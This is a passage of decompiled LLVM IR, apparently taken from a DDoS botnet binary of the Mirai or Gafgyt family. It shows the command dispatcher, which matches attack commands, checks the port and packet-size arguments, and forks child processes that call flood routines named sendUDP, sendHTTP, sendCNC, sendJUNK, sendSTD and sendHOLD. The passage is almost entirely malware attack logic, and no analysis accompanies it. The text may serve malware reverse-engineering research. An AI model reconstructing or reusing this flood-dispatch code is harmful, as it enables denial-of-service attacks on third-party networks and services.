dec_label_pc_1000b8e8:                            ; preds = %dec_label_pc_1000b8d8
  %v3_1000b8f4 = call i32 @sendJUNK(i32 %v2_1000b7fc, i32 %v2_1000b814, i32 %v2_1000b830)
  %v1_1000b8fc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b900

dec_label_pc_1000b900:                            ; preds = %dec_label_pc_1000b8b0, %dec_label_pc_1000b858, %dec_label_pc_1000b780, %dec_label_pc_1000b8e8
  %v2_1000b904 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018e44.512 to i32), i32* @r4, align 4
  %v3_1000b914 = inttoptr i32 %v2_1000b904 to i8*
  %v4_1000b914 = call i32 @__GI_strcoll(i8* %v3_1000b914, i32 ptrtoint ([4 x i8]* @global_var_10018e44.512 to i32))
  %v3_1000b91c = icmp eq i32 %v4_1000b914, 0
  br i1 %v3_1000b91c, label %dec_label_pc_1000b924, label %dec_label_pc_1000bbbc

dec_label_pc_1000b924:                            ; preds = %dec_label_pc_1000b900
  %tmp123 = icmp slt i32 %arg1, 6
  br i1 %tmp123, label %dec_label_pc_1000c69c, label %dec_label_pc_1000b930

dec_label_pc_1000b930:                            ; preds = %dec_label_pc_1000b924
  %v1_1000b934 = add i32 %tmp, 12
  %v1_1000b938 = inttoptr i32 %v1_1000b934 to i32*
  %v2_1000b938 = load i32, i32* %v1_1000b938, align 4
  store i32 268482884, i32* @lr, align 4
  %v2_1000b940 = call i32 @atol(i32 %v2_1000b938, i32 %v1_1000b934)
  %v4_1000b94c = icmp eq i32 %v2_1000b940, -1
  br i1 %v4_1000b94c, label %dec_label_pc_1000c69c, label %dec_label_pc_1000b954

dec_label_pc_1000b954:                            ; preds = %dec_label_pc_1000b930
  %v1_1000b958 = add i32 %tmp, 8
  %v1_1000b95c = inttoptr i32 %v1_1000b958 to i32*
  %v2_1000b95c = load i32, i32* %v1_1000b95c, align 4
  store i32 268482920, i32* @lr, align 4
  %v2_1000b964 = call i32 @atol(i32 %v2_1000b95c, i32 %v1_1000b958)
  %v4_1000b970 = icmp eq i32 %v2_1000b964, -1
  br i1 %v4_1000b970, label %dec_label_pc_1000c69c, label %dec_label_pc_1000b978

dec_label_pc_1000b978:                            ; preds = %dec_label_pc_1000b954
  %v1_1000b97c = add i32 %tmp, 16
  %v1_1000b980 = inttoptr i32 %v1_1000b97c to i32*
  %v2_1000b980 = load i32, i32* %v1_1000b980, align 4
  store i32 268482956, i32* @lr, align 4
  %v2_1000b988 = call i32 @atol(i32 %v2_1000b980, i32 %v1_1000b97c)
  %v4_1000b994 = icmp eq i32 %v2_1000b988, -1
  br i1 %v4_1000b994, label %dec_label_pc_1000c69c, label %dec_label_pc_1000b99c

dec_label_pc_1000b99c:                            ; preds = %dec_label_pc_1000b978
  %v1_1000b9a0 = add i32 %tmp, 20
  %v1_1000b9a4 = inttoptr i32 %v1_1000b9a0 to i32*
  %v2_1000b9a4 = load i32, i32* %v1_1000b9a4, align 4
  store i32 268482992, i32* @lr, align 4
  %v2_1000b9ac = call i32 @atol(i32 %v2_1000b9a4, i32 %v1_1000b9a0)
  %v4_1000b9b8 = icmp eq i32 %v2_1000b9ac, -1
  br i1 %v4_1000b9b8, label %dec_label_pc_1000c69c, label %dec_label_pc_1000b9c0

dec_label_pc_1000b9c0:                            ; preds = %dec_label_pc_1000b99c
  %v2_1000b9c8 = load i32, i32* %v1_1000b9a4, align 4
  store i32 268483028, i32* @lr, align 4
  %v2_1000b9d0 = call i32 @atol(i32 %v2_1000b9c8, i32 %v1_1000b9a0)
  %v3_1000b9e0 = icmp sgt i32 %v2_1000b9d0, 65500
  br i1 %v3_1000b9e0, label %dec_label_pc_1000c69c, label %dec_label_pc_1000b9e8

dec_label_pc_1000b9e8:                            ; preds = %dec_label_pc_1000b9c0
  %v2_1000b9f0 = load i32, i32* %v1_1000b980, align 4
  store i32 268483068, i32* @lr, align 4
  %v2_1000b9f8 = call i32 @atol(i32 %v2_1000b9f0, i32 %v1_1000b97c)
  %v2_1000ba00 = icmp sgt i32 %v2_1000b9f8, 32
  br i1 %v2_1000ba00, label %dec_label_pc_1000c69c, label %dec_label_pc_1000ba08

dec_label_pc_1000ba08:                            ; preds = %dec_label_pc_1000b9e8
  %v3_1000ba0c = icmp eq i32 %arg1, 7
  br i1 %v3_1000ba0c, label %dec_label_pc_1000ba14, label %dec_label_pc_1000ba38

dec_label_pc_1000ba14:                            ; preds = %dec_label_pc_1000ba08
  %v1_1000ba18 = add i32 %tmp, 24
  %v1_1000ba1c = inttoptr i32 %v1_1000ba18 to i32*
  %v2_1000ba1c = load i32, i32* %v1_1000ba1c, align 4
  store i32 268483112, i32* @lr, align 4
  %v2_1000ba24 = call i32 @atol(i32 %v2_1000ba1c, i32 %v1_1000ba18)
  %v2_1000ba2c = icmp sgt i32 %v2_1000ba24, 0
  br i1 %v2_1000ba2c, label %dec_label_pc_1000ba38, label %dec_label_pc_1000c69c

dec_label_pc_1000ba38:                            ; preds = %dec_label_pc_1000ba08, %dec_label_pc_1000ba14
  %v1_1000ba3c = add i32 %tmp, 4
  %v1_1000ba40 = inttoptr i32 %v1_1000ba3c to i32*
  %v2_1000ba40 = load i32, i32* %v1_1000ba40, align 4
  %v2_1000ba50 = load i32, i32* %v1_1000b95c, align 4
  store i32 268483164, i32* @lr, align 4
  %v2_1000ba58 = call i32 @atol(i32 %v2_1000ba50, i32 %v1_1000b958)
  %v2_1000ba6c = load i32, i32* %v1_1000b938, align 4
  store i32 268483192, i32* @lr, align 4
  %v2_1000ba74 = call i32 @atol(i32 %v2_1000ba6c, i32 %v1_1000b934)
  %v2_1000ba88 = load i32, i32* %v1_1000b980, align 4
  store i32 268483220, i32* @lr, align 4
  %v2_1000ba90 = call i32 @atol(i32 %v2_1000ba88, i32 %v1_1000b97c)
  %v2_1000baa4 = load i32, i32* %v1_1000b9a4, align 4
  store i32 268483248, i32* @lr, align 4
  %v2_1000baac = call i32 @atol(i32 %v2_1000baa4, i32 %v1_1000b9a0)
  br i1 %v3_1000ba0c, label %dec_label_pc_1000bac4, label %dec_label_pc_1000bae0

dec_label_pc_1000bac4:                            ; preds = %dec_label_pc_1000ba38
  %v1_1000bac8 = add i32 %tmp, 24
  %v1_1000bacc = inttoptr i32 %v1_1000bac8 to i32*
  %v2_1000bacc = load i32, i32* %v1_1000bacc, align 4
  store i32 268483288, i32* @lr, align 4
  %v2_1000bad4 = call i32 @atol(i32 %v2_1000bacc, i32 %v1_1000bac8)
  br label %dec_label_pc_1000bae8

dec_label_pc_1000bae0:                            ; preds = %dec_label_pc_1000ba38
  br label %dec_label_pc_1000bae8

dec_label_pc_1000bae8:                            ; preds = %dec_label_pc_1000bac4, %dec_label_pc_1000bae0
  %storemerge9 = phi i32 [ 10, %dec_label_pc_1000bae0 ], [ %v2_1000bad4, %dec_label_pc_1000bac4 ]
  store i32 %v2_1000ba40, i32* @r3, align 4
  store i32 268483328, i32* @lr, align 4
  %v2_1000bafc = call i32 @__GI_strchr(i32 %v2_1000ba40, i32 44)
  %v3_1000bb04 = icmp eq i32 %v2_1000bafc, 0
  br i1 %v3_1000bb04, label %dec_label_pc_1000bb88, label %dec_label_pc_1000bb0c

dec_label_pc_1000bb0c:                            ; preds = %dec_label_pc_1000bae8
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268483360, i32* @lr, align 4
  %v3_1000bb1c = call i32 @__GI_strtok(i32 %v2_1000ba40, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000bb7c50 = icmp eq i32 %v3_1000bb1c, 0
  br i1 %v3_1000bb7c50, label %dec_label_pc_1000bbbc, label %dec_label_pc_1000bb2c

dec_label_pc_1000bb2c:                            ; preds = %dec_label_pc_1000bb0c, %dec_label_pc_1000bb60
  %storemerge2451 = phi i32 [ %v3_1000bb6c, %dec_label_pc_1000bb60 ], [ %v3_1000bb1c, %dec_label_pc_1000bb0c ]
  store i32 268483376, i32* @lr, align 4
  %v0_1000bb2c = call i32 @listFork()
  %v3_1000bb34 = icmp eq i32 %v0_1000bb2c, 0
  br i1 %v3_1000bb34, label %dec_label_pc_1000bb3c, label %dec_label_pc_1000bb60

dec_label_pc_1000bb3c:                            ; preds = %dec_label_pc_1000bb2c
  %v6_1000bb54 = call i32 @sendUDP(i32 %storemerge2451, i32 %v2_1000ba58, i32 %v2_1000ba74, i32 %v2_1000ba90, i32 %v2_1000baac, i32 %storemerge9)
  %v1_1000bb5c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bb60

dec_label_pc_1000bb60:                            ; preds = %dec_label_pc_1000bb2c, %dec_label_pc_1000bb3c
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268483440, i32* @lr, align 4
  %v3_1000bb6c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000bb7c = icmp eq i32 %v3_1000bb6c, 0
  br i1 %v3_1000bb7c, label %dec_label_pc_1000bbbc, label %dec_label_pc_1000bb2c

dec_label_pc_1000bb88:                            ; preds = %dec_label_pc_1000bae8
  store i32 268483468, i32* @lr, align 4
  %v0_1000bb88 = call i32 @listFork()
  %v3_1000bb90 = icmp eq i32 %v0_1000bb88, 0
  br i1 %v3_1000bb90, label %dec_label_pc_1000bb98, label %dec_label_pc_1000c69c

dec_label_pc_1000bb98:                            ; preds = %dec_label_pc_1000bb88
  %v6_1000bbb0 = call i32 @sendUDP(i32 %v2_1000ba40, i32 %v2_1000ba58, i32 %v2_1000ba74, i32 %v2_1000ba90, i32 %v2_1000baac, i32 %storemerge9)
  %v1_1000bbb8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bbbc

dec_label_pc_1000bbbc:                            ; preds = %dec_label_pc_1000bb60, %dec_label_pc_1000bb0c, %dec_label_pc_1000b900, %dec_label_pc_1000bb98
  %v2_1000bbc0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10018e48.516 to i32), i32* @r4, align 4
  %v3_1000bbd0 = inttoptr i32 %v2_1000bbc0 to i8*
  %v4_1000bbd0 = call i32 @__GI_strcoll(i8* %v3_1000bbd0, i32 ptrtoint ([5 x i8]* @global_var_10018e48.516 to i32))
  %v3_1000bbd8 = icmp eq i32 %v4_1000bbd0, 0
  br i1 %v3_1000bbd8, label %dec_label_pc_1000bbe0, label %dec_label_pc_1000bdc0

dec_label_pc_1000bbe0:                            ; preds = %dec_label_pc_1000bbbc
  %tmp124 = icmp slt i32 %arg1, 6
  br i1 %tmp124, label %dec_label_pc_1000c69c, label %dec_label_pc_1000bbec

dec_label_pc_1000bbec:                            ; preds = %dec_label_pc_1000bbe0
  %v1_1000bbf0 = add i32 %tmp, 4
  %v1_1000bbf4 = inttoptr i32 %v1_1000bbf0 to i32*
  %v2_1000bbf4 = load i32, i32* %v1_1000bbf4, align 4
  store i32 %v2_1000bbf4, i32* @r3, align 4
  store i32 268483588, i32* @lr, align 4
  %v2_1000bc00 = call i32 @__GI_strchr(i32 %v2_1000bbf4, i32 44)
  %v3_1000bc08 = icmp eq i32 %v2_1000bc00, 0
  br i1 %v3_1000bc08, label %dec_label_pc_1000bd10, label %dec_label_pc_1000bc10

dec_label_pc_1000bc10:                            ; preds = %dec_label_pc_1000bbec
  %v2_1000bc18 = load i32, i32* %v1_1000bbf4, align 4
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268483628, i32* @lr, align 4
  %v3_1000bc28 = call i32 @__GI_strtok(i32 %v2_1000bc18, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000bd0447 = icmp eq i32 %v3_1000bc28, 0
  br i1 %v3_1000bd0447, label %dec_label_pc_1000bdc0, label %dec_label_pc_1000bc38.lr.ph

dec_label_pc_1000bc38.lr.ph:                      ; preds = %dec_label_pc_1000bc10
  %v1_1000bc6c = add i32 %tmp, 12
  %v1_1000bc70 = inttoptr i32 %v1_1000bc6c to i32*
  %v1_1000bc98 = add i32 %tmp, 20
  %v1_1000bc9c = inttoptr i32 %v1_1000bc98 to i32*
  %v1_1000bcb0 = add i32 %tmp, 24
  %v1_1000bcb4 = inttoptr i32 %v1_1000bcb0 to i32*
  br label %dec_label_pc_1000bc38

dec_label_pc_1000bc38:                            ; preds = %dec_label_pc_1000bc38.lr.ph, %dec_label_pc_1000bce8
  store i32 268483644, i32* @lr, align 4
  %v0_1000bc38 = call i32 @listFork()
  %v3_1000bc40 = icmp eq i32 %v0_1000bc38, 0
  br i1 %v3_1000bc40, label %dec_label_pc_1000bc48, label %dec_label_pc_1000bce8

dec_label_pc_1000bc48:                            ; preds = %dec_label_pc_1000bc38
  %v2_1000bc50 = load i32, i32* %v1_1000bbf4, align 4
  store i32 %v2_1000bc50, i32* @r29, align 4
  %v2_1000bc70 = load i32, i32* %v1_1000bc70, align 4
  store i32 268483708, i32* @lr, align 4
  %v2_1000bc78 = call i32 @atol(i32 %v2_1000bc70, i32 %v1_1000bc6c)
  %v1_1000bc80 = urem i32 %v2_1000bc78, 65536
  store i32 %v1_1000bc80, i32* @r27, align 4
  %v2_1000bc9c = load i32, i32* %v1_1000bc9c, align 4
  store i32 268483752, i32* @lr, align 4
  %v2_1000bca4 = call i32 @atol(i32 %v2_1000bc9c, i32 %v1_1000bc98)
  %v2_1000bcb4 = load i32, i32* %v1_1000bcb4, align 4
  store i32 268483776, i32* @lr, align 4
  %v2_1000bcbc = call i32 @atol(i32 %v2_1000bcb4, i32 %v1_1000bcb0)
  %v0_1000bcc4 = load i32, i32* @r29, align 4
  %v0_1000bcc8 = load i32, i32* @r28, align 4
  %v0_1000bccc = load i32, i32* @r27, align 4
  %v0_1000bcd0 = load i32, i32* @r26, align 4
  %v0_1000bcd4 = load i32, i32* @r25, align 4
  %v6_1000bcdc = trunc i32 %v0_1000bccc to i16
  %v7_1000bcdc = call i32 @sendHTTP(i32 %v0_1000bcc4, i32 %v0_1000bcc8, i16 %v6_1000bcdc, i32 %v0_1000bcd0, i32 %v0_1000bcd4, i32 %v2_1000bcbc)
  %v1_1000bce4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bce8

dec_label_pc_1000bce8:                            ; preds = %dec_label_pc_1000bc38, %dec_label_pc_1000bc48
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268483832, i32* @lr, align 4
  %v3_1000bcf4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000bd04 = icmp eq i32 %v3_1000bcf4, 0
  br i1 %v3_1000bd04, label %dec_label_pc_1000bdc0, label %dec_label_pc_1000bc38

dec_label_pc_1000bd10:                            ; preds = %dec_label_pc_1000bbec
  store i32 268483860, i32* @lr, align 4
  %v0_1000bd10 = call i32 @listFork()
  %v3_1000bd18 = icmp eq i32 %v0_1000bd10, 0
  br i1 %v3_1000bd18, label %dec_label_pc_1000bd20, label %dec_label_pc_1000c69c

dec_label_pc_1000bd20:                            ; preds = %dec_label_pc_1000bd10
  %v2_1000bd28 = load i32, i32* %v1_1000bbf4, align 4
  store i32 %v2_1000bd28, i32* @r29, align 4
  %v1_1000bd44 = add i32 %tmp, 12
  %v1_1000bd48 = inttoptr i32 %v1_1000bd44 to i32*
  %v2_1000bd48 = load i32, i32* %v1_1000bd48, align 4
  store i32 268483924, i32* @lr, align 4
  %v2_1000bd50 = call i32 @atol(i32 %v2_1000bd48, i32 %v1_1000bd44)
  %v1_1000bd58 = urem i32 %v2_1000bd50, 65536
  store i32 %v1_1000bd58, i32* @r27, align 4
  %v1_1000bd70 = add i32 %tmp, 20
  %v1_1000bd74 = inttoptr i32 %v1_1000bd70 to i32*
  %v2_1000bd74 = load i32, i32* %v1_1000bd74, align 4
  store i32 268483968, i32* @lr, align 4
  %v2_1000bd7c = call i32 @atol(i32 %v2_1000bd74, i32 %v1_1000bd70)
  %v1_1000bd88 = add i32 %tmp, 24
  %v1_1000bd8c = inttoptr i32 %v1_1000bd88 to i32*
  %v2_1000bd8c = load i32, i32* %v1_1000bd8c, align 4
  store i32 268483992, i32* @lr, align 4
  %v2_1000bd94 = call i32 @atol(i32 %v2_1000bd8c, i32 %v1_1000bd88)
  %v0_1000bd9c = load i32, i32* @r29, align 4
  %v0_1000bda0 = load i32, i32* @r28, align 4
  %v0_1000bda4 = load i32, i32* @r27, align 4
  %v0_1000bda8 = load i32, i32* @r26, align 4
  %v0_1000bdac = load i32, i32* @r25, align 4
  %v6_1000bdb4 = trunc i32 %v0_1000bda4 to i16
  %v7_1000bdb4 = call i32 @sendHTTP(i32 %v0_1000bd9c, i32 %v0_1000bda0, i16 %v6_1000bdb4, i32 %v0_1000bda8, i32 %v0_1000bdac, i32 %v2_1000bd94)
  %v1_1000bdbc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bdc0

dec_label_pc_1000bdc0:                            ; preds = %dec_label_pc_1000bce8, %dec_label_pc_1000bc10, %dec_label_pc_1000bbbc, %dec_label_pc_1000bd20
  %v2_1000bdc4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018e50.520 to i32), i32* @r4, align 4
  %v3_1000bdd4 = inttoptr i32 %v2_1000bdc4 to i8*
  %v4_1000bdd4 = call i32 @__GI_strcoll(i8* %v3_1000bdd4, i32 ptrtoint ([4 x i8]* @global_var_10018e50.520 to i32))
  %v3_1000bddc = icmp eq i32 %v4_1000bdd4, 0
  br i1 %v3_1000bddc, label %dec_label_pc_1000bde4, label %dec_label_pc_1000bf40

dec_label_pc_1000bde4:                            ; preds = %dec_label_pc_1000bdc0
  %tmp125 = icmp slt i32 %arg1, 4
  br i1 %tmp125, label %dec_label_pc_1000c69c, label %dec_label_pc_1000bdf0

dec_label_pc_1000bdf0:                            ; preds = %dec_label_pc_1000bde4
  %v1_1000bdf4 = add i32 %tmp, 8
  %v1_1000bdf8 = inttoptr i32 %v1_1000bdf4 to i32*
  %v2_1000bdf8 = load i32, i32* %v1_1000bdf8, align 4
  store i32 268484100, i32* @lr, align 4
  %v2_1000be00 = call i32 @atol(i32 %v2_1000bdf8, i32 %v1_1000bdf4)
  %tmp126 = icmp slt i32 %v2_1000be00, 1
  br i1 %tmp126, label %dec_label_pc_1000c69c, label %dec_label_pc_1000be10

dec_label_pc_1000be10:                            ; preds = %dec_label_pc_1000bdf0
  %v1_1000be14 = add i32 %tmp, 12
  %v1_1000be18 = inttoptr i32 %v1_1000be14 to i32*
  %v2_1000be18 = load i32, i32* %v1_1000be18, align 4
  store i32 268484132, i32* @lr, align 4
  %v2_1000be20 = call i32 @atol(i32 %v2_1000be18, i32 %v1_1000be14)
  %v2_1000be28 = icmp sgt i32 %v2_1000be20, 0
  br i1 %v2_1000be28, label %dec_label_pc_1000be34, label %dec_label_pc_1000c69c

dec_label_pc_1000be34:                            ; preds = %dec_label_pc_1000be10
  %v1_1000be38 = add i32 %tmp, 4
  %v1_1000be3c = inttoptr i32 %v1_1000be38 to i32*
  %v2_1000be3c = load i32, i32* %v1_1000be3c, align 4
  %v2_1000be4c = load i32, i32* %v1_1000bdf8, align 4
  store i32 268484184, i32* @lr, align 4
  %v2_1000be54 = call i32 @atol(i32 %v2_1000be4c, i32 %v1_1000bdf4)
  %v2_1000be68 = load i32, i32* %v1_1000be18, align 4
  store i32 268484212, i32* @lr, align 4
  %v2_1000be70 = call i32 @atol(i32 %v2_1000be68, i32 %v1_1000be14)
  store i32 %v2_1000be3c, i32* @r3, align 4
  store i32 268484236, i32* @lr, align 4
  %v2_1000be88 = call i32 @__GI_strchr(i32 %v2_1000be3c, i32 44)
  %v3_1000be90 = icmp eq i32 %v2_1000be88, 0
  br i1 %v3_1000be90, label %dec_label_pc_1000bf18, label %dec_label_pc_1000be98

dec_label_pc_1000be98:                            ; preds = %dec_label_pc_1000be34
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268484268, i32* @lr, align 4
  %v3_1000bea8 = call i32 @__GI_strtok(i32 %v2_1000be3c, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000bf0c43 = icmp eq i32 %v3_1000bea8, 0
  br i1 %v3_1000bf0c43, label %dec_label_pc_1000bf40, label %dec_label_pc_1000beb8

dec_label_pc_1000beb8:                            ; preds = %dec_label_pc_1000be98, %dec_label_pc_1000bef0
  %storemerge2044 = phi i32 [ %v3_1000befc, %dec_label_pc_1000bef0 ], [ %v3_1000bea8, %dec_label_pc_1000be98 ]
  store i32 268484284, i32* @lr, align 4
  %v0_1000beb8 = call i32 @listFork()
  %v3_1000bec0 = icmp eq i32 %v0_1000beb8, 0
  br i1 %v3_1000bec0, label %dec_label_pc_1000bec8, label %dec_label_pc_1000bef0

dec_label_pc_1000bec8:                            ; preds = %dec_label_pc_1000beb8
  store i32 268484312, i32* @lr, align 4
  %v3_1000bed4 = call i32 @sendCNC(i32 %storemerge2044, i32 %v2_1000be54, i32 %v2_1000be70)
  %v3_1000bedc = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000bee8.521 to i32), i32* @lr, align 4
  %v1_1000bee4 = call i32 @__libc_close(i32 %v3_1000bedc)
  %v1_1000beec = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bef0

dec_label_pc_1000bef0:                            ; preds = %dec_label_pc_1000beb8, %dec_label_pc_1000bec8
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268484352, i32* @lr, align 4
  %v3_1000befc = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000bf0c = icmp eq i32 %v3_1000befc, 0
  br i1 %v3_1000bf0c, label %dec_label_pc_1000bf40, label %dec_label_pc_1000beb8

dec_label_pc_1000bf18:                            ; preds = %dec_label_pc_1000be34
  store i32 268484380, i32* @lr, align 4
  %v0_1000bf18 = call i32 @listFork()
  %v3_1000bf20 = icmp eq i32 %v0_1000bf18, 0
  br i1 %v3_1000bf20, label %dec_label_pc_1000bf28, label %dec_label_pc_1000c69c

dec_label_pc_1000bf28:                            ; preds = %dec_label_pc_1000bf18
  store i32 ptrtoint ([3 x i8]* @global_var_1000bf38.523 to i32), i32* @lr, align 4
  %v3_1000bf34 = call i32 @sendCNC(i32 %v2_1000be3c, i32 %v2_1000be54, i32 %v2_1000be70)
  %v1_1000bf3c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bf40

dec_label_pc_1000bf40:                            ; preds = %dec_label_pc_1000bef0, %dec_label_pc_1000be98, %dec_label_pc_1000bdc0, %dec_label_pc_1000bf28
  %v2_1000bf44 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10018e54.524 to i32), i32* @r4, align 4
  %v3_1000bf54 = inttoptr i32 %v2_1000bf44 to i8*
  %v4_1000bf54 = call i32 @__GI_strcoll(i8* %v3_1000bf54, i32 ptrtoint ([6 x i8]* @global_var_10018e54.524 to i32))
  %v3_1000bf5c = icmp eq i32 %v4_1000bf54, 0
  br i1 %v3_1000bf5c, label %dec_label_pc_1000bf64, label %dec_label_pc_1000c100

dec_label_pc_1000bf64:                            ; preds = %dec_label_pc_1000bf40
  %tmp127 = icmp slt i32 %arg1, 4
  br i1 %tmp127, label %dec_label_pc_1000c69c, label %dec_label_pc_1000bf70

dec_label_pc_1000bf70:                            ; preds = %dec_label_pc_1000bf64
  %v1_1000bf74 = add i32 %tmp, 8
  %v1_1000bf78 = inttoptr i32 %v1_1000bf74 to i32*
  %v2_1000bf78 = load i32, i32* %v1_1000bf78, align 4
  store i32 268484484, i32* @lr, align 4
  %v2_1000bf80 = call i32 @atol(i32 %v2_1000bf78, i32 %v1_1000bf74)
  %tmp128 = icmp slt i32 %v2_1000bf80, 1
  br i1 %tmp128, label %dec_label_pc_1000c69c, label %dec_label_pc_1000bf90

dec_label_pc_1000bf90:                            ; preds = %dec_label_pc_1000bf70
  %v1_1000bf94 = add i32 %tmp, 12
  %v1_1000bf98 = inttoptr i32 %v1_1000bf94 to i32*
  %v2_1000bf98 = load i32, i32* %v1_1000bf98, align 4
  store i32 268484516, i32* @lr, align 4
  %v2_1000bfa0 = call i32 @atol(i32 %v2_1000bf98, i32 %v1_1000bf94)
  %v2_1000bfa8 = icmp sgt i32 %v2_1000bfa0, 0
  br i1 %v2_1000bfa8, label %dec_label_pc_1000bfb4, label %dec_label_pc_1000c69c

dec_label_pc_1000bfb4:                            ; preds = %dec_label_pc_1000bf90
  %v1_1000bfb8 = add i32 %tmp, 4
  %v1_1000bfbc = inttoptr i32 %v1_1000bfb8 to i32*
  %v2_1000bfbc = load i32, i32* %v1_1000bfbc, align 4
  %v2_1000bfcc = load i32, i32* %v1_1000bf78, align 4
  store i32 268484568, i32* @lr, align 4
  %v2_1000bfd4 = call i32 @atol(i32 %v2_1000bfcc, i32 %v1_1000bf74)
  %v2_1000bfe8 = load i32, i32* %v1_1000bf98, align 4
  store i32 268484596, i32* @lr, align 4
  %v2_1000bff0 = call i32 @atol(i32 %v2_1000bfe8, i32 %v1_1000bf94)
  store i32 %v2_1000bfbc, i32* @r3, align 4
  store i32 268484620, i32* @lr, align 4
  %v2_1000c008 = call i32 @__GI_strchr(i32 %v2_1000bfbc, i32 44)
  %v3_1000c010 = icmp eq i32 %v2_1000c008, 0
  br i1 %v3_1000c010, label %dec_label_pc_1000c0b8, label %dec_label_pc_1000c018

dec_label_pc_1000c018:                            ; preds = %dec_label_pc_1000bfb4
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268484652, i32* @lr, align 4
  %v3_1000c028 = call i32 @__GI_strtok(i32 %v2_1000bfbc, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000c0ac39 = icmp eq i32 %v3_1000c028, 0
  br i1 %v3_1000c0ac39, label %dec_label_pc_1000c100, label %dec_label_pc_1000c038

dec_label_pc_1000c038:                            ; preds = %dec_label_pc_1000c018, %dec_label_pc_1000c090
  %storemerge1840 = phi i32 [ %v3_1000c09c, %dec_label_pc_1000c090 ], [ %v3_1000c028, %dec_label_pc_1000c018 ]
  store i32 268484668, i32* @lr, align 4
  %v0_1000c038 = call i32 @listFork()
  %v3_1000c040 = icmp eq i32 %v0_1000c038, 0
  br i1 %v3_1000c040, label %dec_label_pc_1000c048, label %dec_label_pc_1000c090

dec_label_pc_1000c048:                            ; preds = %dec_label_pc_1000c038
  %v3_1000c054 = call i32 @sendJUNK(i32 %storemerge1840, i32 %v2_1000bfd4, i32 %v2_1000bff0)
  %v3_1000c064 = call i32 @sendSTD(i32 %storemerge1840, i32 %v2_1000bfd4, i32 %v2_1000bff0)
  %v3_1000c074 = call i32 @sendHOLD(i32 %storemerge1840, i32 %v2_1000bfd4, i32 %v2_1000bff0)
  %v3_1000c07c = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c088.525 to i32), i32* @lr, align 4
  %v1_1000c084 = call i32 @__libc_close(i32 %v3_1000c07c)
  %v1_1000c08c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000c090

dec_label_pc_1000c090:                            ; preds = %dec_label_pc_1000c038, %dec_label_pc_1000c048
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268484768, i32* @lr, align 4
  %v3_1000c09c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000c0ac = icmp eq i32 %v3_1000c09c, 0
  br i1 %v3_1000c0ac, label %dec_label_pc_1000c100, label %dec_label_pc_1000c038

dec_label_pc_1000c0b8:                            ; preds = %dec_label_pc_1000bfb4
  store i32 268484796, i32* @lr, align 4
  %v0_1000c0b8 = call i32 @listFork()
  %v3_1000c0c0 = icmp eq i32 %v0_1000c0b8, 0
  br i1 %v3_1000c0c0, label %dec_label_pc_1000c0c8, label %dec_label_pc_1000c69c

dec_label_pc_1000c0c8:                            ; preds = %dec_label_pc_1000c0b8
  %v3_1000c0d4 = call i32 @sendJUNK(i32 %v2_1000bfbc, i32 %v2_1000bfd4, i32 %v2_1000bff0)
  %v3_1000c0e4 = call i32 @sendSTD(i32 %v2_1000bfbc, i32 %v2_1000bfd4, i32 %v2_1000bff0)
  %v3_1000c0f4 = call i32 @sendHOLD(i32 %v2_1000bfbc, i32 %v2_1000bfd4, i32 %v2_1000bff0)
  %v1_1000c0fc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000c100

dec_label_pc_1000c100:                            ; preds = %dec_label_pc_1000c090, %dec_label_pc_1000c018, %dec_label_pc_1000bf40, %dec_label_pc_1000c0c8
  %v2_1000c104 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018e5c.528 to i32), i32* @r4, align 4
  %v3_1000c114 = inttoptr i32 %v2_1000c104 to i8*
  %v4_1000c114 = call i32 @__GI_strcoll(i8* %v3_1000c114, i32 ptrtoint ([4 x i8]* @global_var_10018e5c.528 to i32))
  %v3_1000c11c = icmp eq i32 %v4_1000c114, 0
  br i1 %v3_1000c11c, label %dec_label_pc_1000c124, label %dec_label_pc_1000c270

dec_label_pc_1000c124:                            ; preds = %dec_label_pc_1000c100
  %tmp129 = icmp slt i32 %arg1, 4
  br i1 %tmp129, label %dec_label_pc_1000c69c, label %dec_label_pc_1000c130

